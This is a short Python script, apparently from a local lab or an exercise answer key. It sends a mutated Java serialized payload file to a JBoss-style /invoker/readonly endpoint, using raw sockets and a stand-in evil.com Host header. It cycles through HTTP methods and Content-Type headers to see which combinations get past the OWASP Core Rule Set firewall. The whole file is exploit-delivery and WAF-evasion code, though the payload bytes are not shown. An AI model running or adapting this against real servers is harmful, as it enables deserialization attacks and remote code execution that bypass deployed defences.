# -*- coding: utf-8 -*-
"""方法切换矩阵：PUT/GET/POST × CT 形态 vs 完整 CRS（标准答案实测）。"""
import socket

data = open("bypass3_mut.ser", "rb").read()


def raw(method, ct, host="evil.com"):
    s = socket.create_connection(("127.0.0.1", 18380), timeout=25)
    hdr = method + " /invoker/readonly HTTP/1.1\r\nHost: " + host + "\r\n"
    if ct is not None:
        hdr += "Content-Type: " + ct + "\r\n"
    hdr += "Content-Length: %d\r\nConnection: close\r\n\r\n" % len(data)
    s.sendall(hdr.encode("latin-1") + data)
    resp = b""
    while True:
        try:
            c = s.recv(65536)
        except socket.timeout:
            break
        if not c:
            break
        resp += c
    s.close()
    status = resp.split(b"\r\n", 1)[0].decode(errors="replace")[:40]
    print("%-5s ct=%-30s -> %s" % (method, str(ct)[:30], status))


raw("PUT", None)
raw("PUT", "application/octet-stream")
raw("GET", "application/octet-stream")
raw("POST", None)
raw("POST", "application/octet-stream")
